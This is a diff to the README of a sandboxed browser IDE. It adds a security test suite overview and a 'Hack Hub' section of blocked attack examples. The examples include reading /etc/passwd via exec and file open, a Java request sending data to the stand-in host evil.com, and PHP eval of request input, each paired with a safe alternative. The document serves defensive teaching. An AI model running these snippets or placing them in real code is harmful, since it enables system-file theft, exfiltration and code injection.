@@ -18,6 +18,12 @@
   <img src="https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker" alt="Docker"/>
   <img src="https://img.shields.io/badge/Auto--Scale-1--8_replicas-orange?style=for-the-badge" alt="Auto-Scale"/>
   <img src="https://img.shields.io/badge/Monaco-Editor-9c27b0?style=for-the-badge" alt="Monaco"/>
+  <img src="https://img.shields.io/badge/Security-258+_Tests-red?style=for-the-badge&logo=shield" alt="Security"/>
+</p>
+
+<p align="center">
+  <a href="http://167.71.63.99"><strong>🌐 Live Demo</strong></a> •
+  <a href="http://167.71.63.99/reports/"><strong>🛡️ Security Reports</strong></a>
 </p>
 
 <p align="center">
@@ -26,6 +32,7 @@
   <a href="#-interface-guide">Interface</a> •
   <a href="#-architecture">Architecture</a> •
   <a href="#-security">Security</a> •
+  <a href="#-hack-hub">Hack Hub</a> •
   <a href="#-api-reference">API</a> •
   <a href="#-deployment">Deployment</a>
 </p>
@@ -533,6 +540,160 @@ cap_add:
 | **Memory (per execution)** | 128 MB |
 | **Output Size** | 100 KB |
 | **Code Size** | 100 KB |
+
+---
+
+## 🧪 Security Testing
+
+Browser Coder includes a comprehensive **automated security test suite** with 258+ attack vectors to validate that all security measures are working correctly.
+
+### Test Categories
+
+| Category | Description | Tests |
+|----------|-------------|-------|
+| **Command Execution** | `exec`, `spawn`, `system`, `popen`, `Runtime.exec` | 30+ |
+| **File System** | Read/write files, directory traversal, path manipulation | 35+ |
+| **Network** | Sockets, HTTP requests, DNS lookups, reverse shells | 25+ |
+| **Code Injection** | `eval`, `exec`, dynamic imports, reflection | 40+ |
+| **Process Access** | Environment variables, process info, system properties | 20+ |
+| **Deserialization** | Pickle, ObjectInputStream, YAML, JSON exploits | 15+ |
+| **Privilege Escalation** | SecurityManager bypass, ClassLoader manipulation | 20+ |
+| **Safe Code** | Legitimate code that SHOULD execute (no false positives) | 24 |
+
+### Running Security Tests
+
+```bash
+# Run full security test suite
+docker compose run --rm security-tests
+
+# Output example:
+# ✓ JS: child_process.exec (blocked)
+# ✓ Python: os.system (blocked)  
+# ✓ Java: Runtime.exec (blocked)
+# ✓ PHP: shell_exec (blocked)
+# ✓ JS: Safe console.log (executed) ✓
+# ...
+# ═══════════════════════════════════════
+# ✓ Passed:  258 | ✗ Failed: 0 | Rate: 100%
+```
+
+### Security Reports
+
+After each test run, detailed HTML reports are generated:
+
+- **English Report**: `/reports/security-report-latest.html`
+- **Hebrew Report**: `/reports/security-report-latest-he.html`
+
+📊 **[View Live Security Report →](http://167.71.63.99/reports/2026-01-07_security-report_2026-01-07_08-55-28-705Z.html)**
+
+<details>
+<summary><strong>📋 Report Contents</strong></summary>
+
+- ✅ Pass/Fail summary with percentages
+- 📊 Breakdown by language (JS, TS, Python, PHP, Java)
+- 📁 Breakdown by attack category
+- ⏱️ Execution time per test
+- 🔍 Full code and error details for each test
+- 📈 Visual charts and statistics
+
+</details>
+
+---
+
+## 🏴‍☠️ Hack Hub
+
+Browser Coder includes a built-in **Hack Hub** — an educational security playground where users can learn about code injection, sandbox escapes, and security vulnerabilities.
+
+### Accessing Hack Hub
+
+Click the **"Hack Hub"** button in the IDE sidebar or visit `/hack-hub`.
+
+### Educational Content
+
+The Hack Hub provides:
+
+| Section | Description |
+|---------|-------------|
+| **Attack Vectors** | Learn about common attack patterns for each language |
+| **Why It's Blocked** | Understand the security implications of each attack |
+| **Safe Alternatives** | See how to accomplish tasks safely |
+| **Live Testing** | Try attacks yourself and see them get blocked |
+
+### Example Attack Categories
+
+<details>
+<summary><strong>🔓 Command Injection</strong></summary>
+
+```javascript
+// ❌ Blocked - Command execution
+const { exec } = require('child_process');
+exec('cat /etc/passwd');
+
+// ✅ Safe alternative - No system access needed
+console.log('Process data in-memory instead');
+```
+
+**Why blocked?** Allows arbitrary system command execution, leading to full server compromise.
+
+</details>
+
+<details>
+<summary><strong>📂 File System Access</strong></summary>
+
+```python
+# ❌ Blocked - File reading
+with open('/etc/passwd', 'r') as f:
+    print(f.read())
+
+# ✅ Safe alternative - Work with provided data
+data = "provided input"
+print(data.upper())
+```
+
+**Why blocked?** Prevents reading sensitive system files and source code.
+
+</details>
+
+<details>
+<summary><strong>🌐 Network Exfiltration</strong></summary>
+
+```java
+// ❌ Blocked - Outbound network
+URL url = new URL("http://evil.com/steal?data=secret");
+HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+
+// ✅ Safe alternative - No network needed for computation
+System.out.println("Compute locally: " + (2 + 2));
+```
+
+**Why blocked?** Prevents data exfiltration and command-and-control communication.
+
+</details>
+
+<details>
+<summary><strong>🔄 Code Injection</strong></summary>
+
+```php
+// ❌ Blocked - Dynamic code execution
+eval($_GET['code']);
+
+// ✅ Safe alternative - Static, validated logic
+$result = 2 + 2;
+echo $result;
+```
+
+**Why blocked?** Dynamic code execution allows arbitrary code injection attacks.
+
+</details>
+
+### Security Philosophy
+
+> 🎓 **"Learn attacks to build better defenses"**
+>
+> The Hack Hub is designed for educational purposes. Understanding how attacks work helps developers:
+> - Write more secure code
+> - Understand why security restrictions exist
+> - Recognize vulnerable patterns in their own applications
 
 ---
 
